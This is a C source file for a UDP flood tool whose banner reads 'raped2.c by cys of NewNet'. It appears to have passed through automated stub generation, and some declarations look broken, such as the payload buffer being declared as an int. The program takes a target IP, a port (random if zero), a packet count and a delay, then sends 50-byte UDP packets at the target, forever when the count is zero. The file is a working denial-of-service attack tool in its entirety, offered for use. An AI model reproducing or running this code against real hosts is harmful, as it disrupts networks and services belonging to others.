
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct TYPE_2__ {int s_addr; } ;
struct sockaddr_in {int sin_port; TYPE_1__ sin_addr; int sin_family; } ;
struct sockaddr {int dummy; } ;
typedef int sin ;


 int AF_INET ;
 int IPPROTO_UDP ;
 int SOCK_DGRAM ;
 int atoi (char*) ;
 int connect (int,struct sockaddr*,int) ;
 scalar_t__ elapsed ;
 int exit (int) ;
 int htons (int) ;
 int inet_addr (char*) ;
 int printf (char*,...) ;
 int rand () ;
 int send (int,int ,int,int ) ;
 int sendcount ;
 int shit ;
 int signal (int,int ) ;
 int socket (int ,int ,int ) ;
 int srand (unsigned int) ;
 int stats ;
 scalar_t__ time (int *) ;
 int usage (char*) ;
 int usleep (int) ;

int main(int argc, char **argv)
{
 struct sockaddr_in sin;
 int port, amount, i, s;
 elapsed = time(0);
 {int n;for (n=1;n<32;n++) signal(n,stats);}
 if(argc < 5)
  usage(argv[0]);

 if (atoi(argv[2]) != 0) {
  amount = atoi(argv[2]);
 } else {
  amount = 0;
 }

 if(atoi(argv[3]) == 0)
 {
  srand((unsigned int)time(((void*)0)));
  port = rand() % 65535;
 } else {
  if(atoi(argv[3]) < 1 || atoi(argv[3]) > 65535)
  {
   printf("Port must be over 1 and under 65535\n");
   exit(-1);
  } else {
   port = atoi(argv[3]);
  }
 }

 sin.sin_family=AF_INET;
 sin.sin_addr.s_addr=inet_addr(argv[1]);
 sin.sin_port=htons(port);
 s = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP);
 connect(s,(struct sockaddr *)&sin,sizeof(sin));
 printf("raped2.c by cys of NewNet\n");
 if(amount == 0) {
  printf("ip:%s x:0 port:%d delay:%d\n",argv[1],port,atoi(argv[4]));
  for(;;) {
   send(s,shit,50,0);
   sendcount++;
   if(atoi(argv[4])!=0) usleep(atoi(argv[4]));
  }
 } else {
  printf("ip:%s x:%d port:%d delay:%d\n",argv[1],amount,port,atoi(argv[4]));
  for(i=0;i<amount;i++){
   send(s,shit,50,0);
   sendcount++;
   if(atoi(argv[4])!=0) usleep(atoi(argv[4]));
  }
 }
 printf("Exiting...\n");
}
